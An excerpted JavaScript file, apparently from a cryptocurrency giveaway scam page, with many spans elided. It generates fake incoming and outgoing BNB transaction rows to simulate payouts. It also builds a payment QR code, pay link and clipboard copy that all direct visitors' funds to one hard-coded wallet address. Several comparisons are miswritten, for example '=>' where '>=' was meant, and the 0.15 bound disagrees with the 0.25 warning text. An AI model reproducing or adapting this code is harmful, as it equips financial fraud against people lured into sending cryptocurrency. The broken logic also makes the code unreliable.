...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bnb1mztqyqdljf7gudjrhmyzu369z9rrxhqlasyq3f</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bnb1mztqyqdljf7gudjrhmyzu369z9rrxhqlasyq3f</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' BNB</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 0.15 && $('#cal-in').val() <= 5000) {
      amount_entered = $('#cal-in').val()
      tm = Date.now()
      $('#gen-amount').text(amount_entered)
      $('#qrcode_svg').attr(
        'src',
        'https://api.qrserver.com/v1/create-qr-code/?data=bitcoin%3Abnb1mztqyqdljf7gudjrhmyzu369z9rrxhqlasyq3f%3Famount%3D' +
          amount_entered +
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'bitcoin:bnb1mztqyqdljf7gudjrhmyzu369z9rrxhqlasyq3f?amount=' +
            amount_entered +
    ...
    } else $('#warn').text('Amount should be within 0.25 BNB to 5000 BNB')
  }),
  $('#close').click(() => {
  ...
  $("#cal-in").on("input", () => {
    ...
    } else if (in_amount => 0.05 && in_amount <= 5000) {
...
$('#cal-out').on('input', () => {
  ...
  } else if ((in_amount) => 15 && in_amount <= 5000) {
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'bnb1mztqyqdljf7gudjrhmyzu369z9rrxhqlasyq3f',
  )
